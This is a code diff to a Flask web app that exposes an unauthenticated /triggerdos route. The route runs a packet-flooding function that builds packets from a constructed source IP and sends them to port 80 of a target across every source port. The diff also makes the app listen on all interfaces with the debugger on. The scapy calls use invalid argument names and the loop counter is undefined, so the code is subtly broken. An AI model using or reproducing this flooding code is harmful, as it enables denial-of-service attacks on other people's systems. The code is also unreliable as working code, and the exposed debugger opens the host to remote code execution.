@@ -1,6 +1,6 @@
 import os
 from flask import Flask, render_template, request
-from werkzeug import secure_filename
+from werkzeug.utils import secure_filename
 app = Flask(__name__)
 
 import config
@@ -25,8 +25,8 @@ def dos():
       Source_ip = a + dot + b + dot + c + dot + d
         
       for source_port in range(1, 65535):
-         IP1 = scapy.IP(source_IP = Source_ip, destination = target_IP)
-         TCP1 = scapy.TCP(srcport = source_port, dstport = 80)
+         IP1 = IP(source_IP = Source_ip, destination = target_IP)
+         TCP1 = TCP(srcport = source_port, dstport = 80)
          pkt = IP1 / TCP1
          send(pkt,inter = .001)
          print ("packet sent ", i)
@@ -44,15 +44,22 @@ def upload_file_func():
       return 'config file uploaded successfully'
 
 @app.route('/pcap_uploader', methods = ['GET', 'POST'])
-def upload_file_func():
+def upload_pcap_file_func():
    if request.method == 'POST':
       f = request.files['file']
       f.save(secure_filename(f.filename))
       return 'pcap file uploaded successfully'
-		
-if __name__ == '__main__':
-   app.run(debug = True)
 
 @app.route('/triggerdos')
 def triggerdos():
     dos()
+		
+@app.route('/')
+def test():
+    return "Welcome"
+
+if __name__ == '__main__':
+   app.run(host='0.0.0.0',debug = True)
+
+
+
